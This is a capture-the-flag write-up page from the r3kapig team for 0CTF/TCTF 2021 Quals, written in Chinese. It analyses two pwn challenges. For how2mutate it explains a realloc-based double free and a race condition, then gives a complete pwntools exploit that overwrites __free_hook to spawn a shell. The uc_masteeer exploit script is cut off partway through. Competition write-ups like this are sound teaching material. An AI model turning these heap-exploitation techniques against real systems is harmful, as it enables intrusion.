<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>0CTF/TCTF 2021 Quals Writeup | r3kapig</title>
    <meta property="og:title" content="r3kapig writeup" />
    <meta property="og:locale" content="en_US" />
    <meta name="description" content="Writeup for 0CTF/TCTF 2021 Quals Writeup" />
    <meta property="og:description" content="Writeup for 0CTF/TCTF 2021 Quals Writeup" />
    <link rel="canonical" href="https://r3kapig.com/writeup/" />
    <meta property="og:url" content="https://r3kapig.com/writeup/" />
    <meta property="og:site_name" content="r3kapig" />
    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
  </head>
  <style>
  body {
      padding-top: 56px;
  }

  .sticky-offset {
      top: 56px;
  }

  #body-row {
      margin-left:0;
      margin-right:0;
  }
  #sidebar-container {
      min-height: 100vh;   
      background-color: #333;
      padding: 0;
  }

  /* Sidebar sizes when expanded and expanded */
  .sidebar-expanded {
      width: 230px;
  }
  .sidebar-collapsed {
      width: 60px;
  }

  /* Menu item*/
  #sidebar-container .list-group a {
      min-height: 50px;
      color: white;
  }

  /* Submenu item*/
  #sidebar-container .list-group .sidebar-submenu a {
      min-height: 45px;
      padding-left: 60px;
  }
  .sidebar-submenu {
      font-size: 0.9rem;
  }

  /* Separators */
  .sidebar-separator-title {
      background-color: #333;
      height: 35px;
  }
  .sidebar-separator {
      background-color: #333;
      height: 25px;
  }
  .logo-separator {
      background-color: #333;    
      height: 60px;
  }


  /* 
   active scrollspy
  */
  .list-group-item.active {
    border-color: transparent;
    border-left: #e69138 solid 4px;
  }

  /* 
   anchor padding top
   https://stackoverflow.com/a/28824157
  */
  :target:before {
    content:"";
    display:block;
    height:56px; /* fixed header height*/
    margin:-56px 0 0; /* negative fixed header height */
  }
  </style>
  
  <script>
  // https://stackoverflow.com/a/48330533
  $(window).on('activate.bs.scrollspy', function (event) {
    let active_collapse = $($('.list-group-item.active').parents()[0]);
    $(".collapse").removeClass("show");
    active_collapse.addClass("show");

    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
    $('a[href^="#submenu"]').css("border-left", "");
    parent_menu.css("border-left","#e69138 solid 4px");
  });

  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [['$','$'], ['\\(','\\)']],
      processEscapes: true
    }
  });
  </script>

  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
        <span class="navbar-toggler-icon"></span>
      </button>
      <a class="navbar-brand" href="../">
        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
        <span class="menu-collapsed">r3kapig / writeup</span>
      </a>
      <div class="collapse navbar-collapse" id="navbarNavDropdown">
        <ul class="navbar-nav my-2 my-lg-0">
            
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                pwn
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#how2mutate">how2mutate</a>
    
                <a class="dropdown-item" href="#uc_masteeer">uc_masteeer</a>
    
                <a class="dropdown-item" href="#uc_goood">uc_goood</a>
    
                <a class="dropdown-item" href="#listbook">listbook</a>
    
                <a class="dropdown-item" href="#babyheap2021">babyheap2021</a>
    
                <a class="dropdown-item" href="#ioa">ioa</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                web
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#1linephp">1linephp</a>
    
                <a class="dropdown-item" href="#worldcup">worldcup</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                reverse
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#vp">vp</a>
    
                <a class="dropdown-item" href="#fea">fea</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                crypto
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#checkin">checkin</a>
    
                <a class="dropdown-item" href="#zer0lfsr-">zer0lfsr-</a>
    
              </div>
            </li>
    
            <li class="nav-item dropdown d-sm-block d-md-none">
              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                misc
              </a>
              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
                                <a class="dropdown-item" href="#uc_baaaby">uc_baaaby</a>
    
                <a class="dropdown-item" href="#pypypypy">pypypypy</a>
    
                <a class="dropdown-item" href="#singer">singer</a>
    
                <a class="dropdown-item" href="#gas-machine">gas-machine</a>
    
                <a class="dropdown-item" href="#guthib">guthib</a>
    
              </div>
            </li>
    
        </ul>
      </div>
      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
        </ul>
      </div>
    </nav>
    <div class="row" id="body-row">
      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
        <ul class="list-group sticky-top sticky-offset">
          
          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">pwn</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu0" class="collapse sidebar-submenu">
            <a href="#how2mutate" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">how2mutate</span>
            </a>
    
<a href="#uc_masteeer" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">uc_masteeer</span>
            </a>
    
<a href="#uc_goood" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">uc_goood</span>
            </a>
    
<a href="#listbook" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">listbook</span>
            </a>
    
<a href="#babyheap2021" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">babyheap2021</span>
            </a>
    
<a href="#ioa" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">ioa</span>
            </a>
    
          </div>
    
          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">web</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu1" class="collapse sidebar-submenu">
            <a href="#1linephp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">1linephp</span>
            </a>
    
<a href="#worldcup" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">worldcup</span>
            </a>
    
          </div>
    
          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">reverse</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu2" class="collapse sidebar-submenu">
            <a href="#vp" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">vp</span>
            </a>
    
<a href="#fea" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">fea</span>
            </a>
    
          </div>
    
          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">crypto</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu3" class="collapse sidebar-submenu">
            <a href="#checkin" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">checkin</span>
            </a>
    
<a href="#zer0lfsr-" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">zer0lfsr-</span>
            </a>
    
          </div>
    
          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
              <span class="fa fa-dashboard fa-fw mr-3"></span>
              <span class="menu-collapsed">misc</span>
              <span class="submenu-icon ml-auto"></span>
            </div>
          </a>
          <div id="submenu4" class="collapse sidebar-submenu">
            <a href="#uc_baaaby" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">uc_baaaby</span>
            </a>
    
<a href="#pypypypy" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">pypypypy</span>
            </a>
    
<a href="#singer" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">singer</span>
            </a>
    
<a href="#gas-machine" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">gas-machine</span>
            </a>
    
<a href="#guthib" class="list-group-item list-group-item-action text-white bg-dark">
              <span class="menu-collapsed">guthib</span>
            </a>
    
          </div>
    
        </ul>
      </div>
      <div class="col-10 py-3">
        <article class="markdown-body"><h1 id="0ctftctf-2021-quals-writeup"><a class="header-link" href="#0ctftctf-2021-quals-writeup"></a>0CTF/TCTF 2021 Quals Writeup</h1>
<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
<h3 id="how2mutate"><a class="header-link" href="#how2mutate"></a>how2mutate</h3>
<p>漏洞点在mutate seed函数中</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">mutate_seed</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">16</span>];
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index: &quot;</span>);
    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);
    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>]&gt;=<span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; buf[<span class="hljs-number">0</span>]&lt;=<span class="hljs-string">&#x27;9&#x27;</span>) {
        <span class="hljs-keyword">int</span> idx = buf[<span class="hljs-number">0</span>]-<span class="hljs-string">&#x27;0&#x27;</span>;
        <span class="hljs-keyword">if</span> (seeds[idx]) {
            run.dynfile-&gt;size = seedssz[idx];
            <span class="hljs-built_in">memcpy</span>(run.dynfile-&gt;data, seeds[idx], seedssz[idx]);
            mangle_mangleContent(&amp;run, <span class="hljs-number">1</span>);
            seedssz[idx] = run.dynfile-&gt;size;
            seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
            <span class="hljs-built_in">memcpy</span>(seeds[idx], run.dynfile-&gt;data, seedssz[idx]);
        }
    }
}</code></pre><p>这里的realloc函数的size，也就是seedssz[index]可以为0</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">add_seed</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;
    <span class="hljs-keyword">while</span> (i&lt;<span class="hljs-number">10</span> &amp;&amp; seeds[i]) i++;
    <span class="hljs-keyword">if</span> (i&lt;<span class="hljs-number">10</span>) {
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);
        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;seedssz[i]);
        <span class="hljs-keyword">int</span> sz = seedssz[i]+<span class="hljs-number">1</span>;
        <span class="hljs-keyword">if</span> (sz&gt;<span class="hljs-number">0</span> &amp;&amp; sz&lt;<span class="hljs-number">0x8000</span>) {
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;content: &quot;</span>);
            seeds[i] = util_Calloc(sz);
            read(<span class="hljs-number">0</span>, seeds[i], seedssz[i]);
        }
    }
}</code></pre><p>跟进去ida看一下utilrealloc逻辑</p>
<pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">void</span> *__fastcall <span class="hljs-title">util_realloc</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *ptr, <span class="hljs-keyword">size_t</span> len)</span>
</span>{
  <span class="hljs-keyword">void</span> *v2; <span class="hljs-comment">// r12</span>

  v2 = <span class="hljs-built_in">realloc</span>(ptr, len);
  <span class="hljs-keyword">if</span> ( !v2 )
  {
    <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)magic &gt; <span class="hljs-number">1</span> )
      put_debug_info(<span class="hljs-number">2u</span>, <span class="hljs-string">&quot;util_Realloc&quot;</span>, <span class="hljs-number">0x4B</span>u, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;realloc(%p, %zu)&quot;</span>, ptr, len);
    <span class="hljs-built_in">free</span>(ptr);
  }
  <span class="hljs-keyword">return</span> v2;
}</code></pre><p>这里如果len是0，realloc返回值为0，他再次free就会有个直接的doublefree。</p>
<p>这里注意一下，由于put_debug_info函数会调用localtime相关的函数，第一次调用的时候会打开localtime文件，会调用一个strdup，所以会把上面free掉的chunk拿来用，所以第一次不会触发doublefree，同时他也会把堆地址信息打印出来。</p>
<p>在第二次utilrealloc(ptr,0)的时候就会触发doublefree了，这里面是0x20大小的chunk，tcache直白的doublefree会报错，需要改他的key字段才行，但是现在还没有uaf。</p>
<p>这里需要利用fuzz函数：</p>
<pre class="hljs"><code>   <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;9&#x27;</span>) {
        <span class="hljs-keyword">bool</span> ok=<span class="hljs-literal">true</span>;
        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">2</span>; i&lt;<span class="hljs-number">15</span>; i++) {
            buf[i] += buf[i<span class="hljs-number">-1</span>];
            <span class="hljs-keyword">if</span> (buf[i] != buf[i+<span class="hljs-number">1</span>])
                ok = <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">if</span> (ok)
            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;path 8&quot;</span>);
    }
    <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;0&#x27;</span>) {
        <span class="hljs-keyword">bool</span> ok=<span class="hljs-literal">true</span>;
        <span class="hljs-keyword">for</span> (i=<span class="hljs-number">2</span>; i&lt;<span class="hljs-number">15</span>; i++) {
            buf[i] -= buf[i<span class="hljs-number">-1</span>];
            <span class="hljs-keyword">if</span> (buf[i] != buf[i+<span class="hljs-number">1</span>])
                ok = <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">if</span> (ok)
            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;path 9&quot;</span>);
    }</code></pre><p>可以看到如果第一个字节为0或者9就会改变buf中的内容。在主函数中是开启一个线程的方式调用的。</p>
<pre class="hljs"><code><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (buf[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;6&#x27;</span>) {
            subproc_runThread(&amp;hfuzz, &amp;fuzzthread, tofuzz, <span class="hljs-literal">false</span>);</code></pre><p>所以说思路就是利用这个race condition来修改key字段，达到uaf效果。</p>
<p>最开始的思路是先输入个0或者9，然后通过mutate变异，给他size弄成0.后来在调试的时候发现如果size是0了，会出一个noinput异常，不会触发doublefree。</p>
<p>所以改变一下思路，我们先free一个结尾是0x30（也就是字符0）的chunk放到tcache中，然后我们第一次free后fd就被写入了这个地址，然后这时候子线程就会改变fd以及后面的key值，第二次free时候就有uaf了。</p>
<p>有了uaf后就是个极其简单的堆题目了，具体做法就不在这里赘述了。</p>
<p>exp：</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)
<span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span>
myelf = ELF(<span class="hljs-string">&quot;./how2mutate&quot;</span>)
<span class="hljs-comment">#ld    = ELF(&quot;./ld-2.30.so&quot;)</span>
<span class="hljs-comment">#libc = ELF(&#x27;./libc-2.31.so&#x27;)</span>
libc = ELF(<span class="hljs-string">&#x27;/usr/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)
local = <span class="hljs-literal">True</span>
load_lib = <span class="hljs-literal">False</span>
io = process(argv = [myelf.path])
<span class="hljs-string">&#x27;&#x27;&#x27;if not local:
        io = remote(&#x27;124.16.75.162&#x27;,31022)
elif load_lib :
        io = process(argv=[ld.path,myelf.path],env={&quot;LD_PRELOAD&quot;:&#x27;./libc-2.30.so&#x27;})
        gdb_text_base = int(os.popen(&quot;pmap {}| awk &#x27;{{print $1}}&#x27;&quot;.format(io.pid)).readlines()[1], 16)
        gdb_libc_base = int(os.popen(&quot;pmap {}| grep libc | awk &#x27;{{print $1}}&#x27;&quot;.format(io.pid)).readlines()[0], 16)
        
else:
        io = process(argv = [myelf.path])#,env={&quot;LD_PRELOAD&quot;:&#x27;./libc-2.31.so&#x27;})
        gdb_text_base = int(os.popen(&quot;pmap {}| awk &#x27;{{print $1}}&#x27;&quot;.format(io.pid)).readlines()[1], 16)
        gdb_libc_base = int(os.popen(&quot;pmap {}| grep libc | awk &#x27;{{print $1}}&#x27;&quot;.format(io.pid)).readlines()[0], 16)
def debug(addr=0,cmd=&#x27;&#x27;,PIE=False):
    if PIE: addr = gdb_text_base + addr
    log.warn(&quot;breakpoint_addr --&gt; 0x%x&quot; % addr)
    gdb.attach(io,&quot;b *{}\nc\n&quot;.format(hex(addr))+cmd)&#x27;&#x27;&#x27;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p</span>():</span>
        gdb.attach(io)
        raw_input()        
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choice</span>(<span class="hljs-params">c</span>):</span>
        io.recvuntil(<span class="hljs-string">&#x27;&gt; &#x27;</span>)
        io.sendline(<span class="hljs-built_in">str</span>(c))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">sz,content</span>):</span>
        choice(<span class="hljs-number">1</span>)
        io.recvuntil(<span class="hljs-string">&#x27;size: &#x27;</span>)
        io.sendline(<span class="hljs-built_in">str</span>(sz))
        io.recvuntil(<span class="hljs-string">&#x27;content: &#x27;</span>)
        io.send(content)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span>
        choice(<span class="hljs-number">3</span>)
        
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">index</span>):</span>
        choice(<span class="hljs-number">4</span>)
        io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)
        io.sendline(<span class="hljs-built_in">str</span>(index))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mutate</span>(<span class="hljs-params">index</span>):</span>
        choice(<span class="hljs-number">2</span>)
        io.recvuntil(<span class="hljs-string">&#x27;index: &#x27;</span>)
        io.sendline(<span class="hljs-built_in">str</span>(index))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">setmutate</span>(<span class="hljs-params">num</span>):</span>
        choice(<span class="hljs-number">5</span>)
        io.recvuntil(<span class="hljs-string">&#x27;mutationsPerRun: &#x27;</span>)
        io.sendline(<span class="hljs-built_in">str</span>(num))
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span>():</span>
        choice(<span class="hljs-number">6</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>
        <span class="hljs-comment">#</span>
        add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#0</span>
        <span class="hljs-comment">#gdb.attach(io,&#x27;b fopen&#x27;)</span>
        setmutate(<span class="hljs-number">0</span>)
        mutate(<span class="hljs-number">0</span>)

        <span class="hljs-comment">#</span>
        io.recvuntil(<span class="hljs-string">&#x27;util_Realloc():75 realloc(&#x27;</span>)
        heapleak = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)
        log.success(<span class="hljs-built_in">hex</span>(heapleak))
        heap_base = heapleak - <span class="hljs-number">0x13a0</span>
        log.success(<span class="hljs-built_in">hex</span>(heap_base))
        
        
        add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#0</span>
        add(<span class="hljs-number">0x480</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment">#1</span>
        add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#2</span>
        
        delete(<span class="hljs-number">2</span>)
        fuzz()
        mutate(<span class="hljs-number">0</span>)

        target = heap_base + <span class="hljs-number">0x1340</span>
        unsorted = heap_base + <span class="hljs-number">0x1a30</span> -<span class="hljs-number">0x490</span>
        delete(<span class="hljs-number">1</span>)
        add(<span class="hljs-number">8</span>,p64(target))<span class="hljs-comment">#0 3tcache remain</span>
        add(<span class="hljs-number">8</span>,p64(unsorted))<span class="hljs-comment">#1 2tcache remain</span>
        add(<span class="hljs-number">8</span>,p64(unsorted))<span class="hljs-comment">#2</span>
        show()

        io.recvuntil(<span class="hljs-string">&#x27;6: &#x27;</span>)
        leak = u64(io.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\x00\x00&#x27;</span>)
        libc_base = leak - <span class="hljs-number">0x1ebbe0</span>
        sys = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]
        frh = libc_base + libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]
        log.success(<span class="hljs-built_in">hex</span>(libc_base))

        add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#3 </span>

        add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<span class="hljs-comment">#4</span>
        add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-comment">#5</span>

        delete(<span class="hljs-number">5</span>)
        fuzz()
        mutate(<span class="hljs-number">3</span>)
        add(<span class="hljs-number">8</span>,p64(frh))
        add(<span class="hljs-number">8</span>,p64(sys))
        add(<span class="hljs-number">8</span>,p64(sys))
        delete(<span class="hljs-number">4</span>)


        io.interactive()
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
        io = remote(<span class="hljs-string">&#x27;111.186.59.27&#x27;</span>, <span class="hljs-number">12345</span>)
        exp()
        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
                <span class="hljs-keyword">try</span>:
                        <span class="hljs-comment">#io = process(argv = [myelf.path])</span>
                        io = remote(<span class="hljs-string">&#x27;111.186.59.27&#x27;</span>, <span class="hljs-number">12345</span>)
                        exp()
                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;failed&quot;</span>)
                        io.close()
<span class="hljs-comment">#flag{ANd_1iK3_7he_cat_I_hAVe_niN3_tiMe5_7o_d1e}</span></code></pre><h3 id="uc_masteeer"><a class="header-link" href="#uc_masteeer"></a>uc_masteeer</h3>
<p>通过分析MAIN，得到程序基本流程如下：</p>
<ul class="list">
<li><p>3个功能的菜单：1. admin test/2. user test/3. patch data</p>
<ul class="list">
<li>admin test ：跳到CODE+0x1000的位置执行代码</li>
</ul>
</li>
<li><p>user test ：跳到CODE+0x1000的位置执行代码</p>
</li>
<li><p>patch data：对任意地址写0xff以内字节的数据</p>
</li>
</ul>
<p>admin test和user test看起来一样，但是不同点在于之前的admin_hook， admin_offset的值就是0xdeadbeef066，所以当执行到这里的时候，会发生ADMIN被拷贝到CODE+0x1000然后再去执行，而user test则是直接跳到CODE+0x1000的位置执行。</p>
<ul class="list">
<li><p>0xdeadbeef066会触发admin_hook，ADMIN被拷贝到CODE+0x1000，同时is_admin=True，然后程序跳到CODE+0x1000执行</p>
</li>
<li><p>0xdeadbef0028的时候，如果is_admin=True，那么可以触发hook_mem_access，但是地址不可控，同时执行之后is_admin=False</p>
</li>
</ul>
<p>所以我们需要做的事情就是既要触发0xdeadbeef066处的admin_hook，但是又不能让程序执行到0xdeadbef0028的位置，然后跳到一个类似这样的位置来完成利用：</p>
<pre class="hljs"><code>lea    rax, <span class="hljs-comment">[k33nlab/readflag&#x27;s address]</span>
movabs    qword ptr <span class="hljs-comment">[0xbabecafe233]</span>, rax</code></pre><p>所以一定要在0xdeadbeef066-0xdeadbef0028这段程序执行过程之间来找答案！</p>
<p>注意到程序跳转到CODE+0x1000是通过以下方式：</p>
<pre class="hljs"><code><span class="hljs-number">0xdeadbeef087</span>:    movabs    <span class="hljs-built_in">rdi</span>, <span class="hljs-number">0xbabecafe000</span>
<span class="hljs-number">0xdeadbeef091</span>:    <span class="hljs-keyword">jmp</span>    <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span>]</code></pre><p>0xbabecafe000是可读可写的栈地址，所以如果我们可以通过patch_data修改了里面的数据，那么就可以让程序不会跳转到CODE+0x1000了</p>
<p>之后我们再patch_data将栈中地址改回CODE+0x1000的位置，同时修改掉CODE+0x1000的代码，将0xdeadbef0053处的值改为&quot;k33nlab/readflag&quot;，然后执行user_test跳转过去就可以了</p>
<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *

context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
context.arch = <span class="hljs-string">&quot;amd64&quot;</span>
context.os = <span class="hljs-string">&quot;linux&quot;</span>

IP, PORT = <span class="hljs-string">&quot;111.186.59.29&quot;</span>, <span class="hljs-number">10087</span>

p = remote(IP, PORT)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">patch_data</span>(<span class="hljs-params">addr, size, data</span>):</span>
    p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)
    p.sendafter(<span class="hljs-string">&quot;addr: \x00&quot;</span>, p64(addr))
    p.sendafter(<span class="hljs-string">&quot;size: \x00&quot;</span>, p64(size))
    p.sendafter(<span class="hljs-string">&quot;data: \x00&quot;</span>, data)

my_code = <span class="hljs-string">b&quot;\x90&quot;</span>
p.send(my_code)

CODE = <span class="hljs-number">0xdeadbeef000</span>
STACK = <span class="hljs-number">0xbabecafe000</span>
patch_data(STACK, <span class="hljs-number">8</span>, p64(CODE))

p.sendlineafter(<span class="hljs-string">&quot;?: \x00&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)

patch_data(STACK, <span class="hljs-number">8</span>, p64(CODE+<span class="hljs-number">0x1000</span>))
